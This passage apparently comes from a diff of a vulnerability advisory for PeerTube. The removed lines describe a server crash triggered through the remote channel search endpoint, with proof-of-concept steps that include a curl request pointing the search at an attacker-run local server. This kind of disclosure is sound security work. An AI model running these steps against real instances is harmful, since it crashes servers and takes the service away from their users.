valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (insert the user token in the proper place):
-
-   ```
-   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
-   ```
-
-   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
 
 ## Vulnerability Mitigations
 
